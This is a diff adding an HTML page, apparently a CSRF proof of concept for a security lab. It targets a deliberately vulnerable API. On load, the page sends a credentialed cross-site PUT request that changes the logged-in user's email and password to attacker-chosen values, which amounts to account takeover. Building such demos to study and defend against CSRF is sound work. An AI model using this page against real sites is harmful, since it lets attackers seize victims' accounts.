@@ -1,0 +1,59 @@
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <title>Attacker - Put User Update</title>
+    <script>
+        const website = "https://unsafe-api.ian-chains.be/";
+
+        function set_status(message, type) {
+            const el = document.getElementById('status');
+            if (!el) {
+                return;
+            }
+
+            el.textContent = message;
+            el.style.color = type === 'error' ? '#b91c1c' : '#166534';
+        }
+
+        async function put_update_user() {
+            const url = website + "/update/users";
+            set_status('User aanpassen...', 'info');
+
+            try {
+                const response = await fetch(url, {
+                    method: "PUT",
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'include',
+                    body: JSON.stringify({
+                        email: "attacker@unsafe.com",
+                        password: "Attacker12345"
+                    })
+                });
+
+                const result = await response.json();
+                if (!response.ok) {
+                    console.error('Status:', response.status, 'Error:', result);
+                    set_status('Fout bij aanpassen van user data (HTTP ' + response.status + ').', 'error');
+                    return;
+                }
+
+                console.log('User data updated successfully:', result);
+                set_status('User data succesvol aangepast.', 'success');
+                return;
+            } catch (error) {
+                console.error(error);
+                set_status('Netwerkfout: ' + (error.message || String(error)), 'error');
+                error_modal('Network error', error.message || String(error));
+            }
+        }
+
+        window.onload = () => {
+            put_update_user();
+        };
+    </script>
+</head>
+<body>
+<h1 class="text-3xl font-bold mb-4">Put User Update</h1>
+<p id="status">Wachten op laden...</p>
+<body>
+</html>
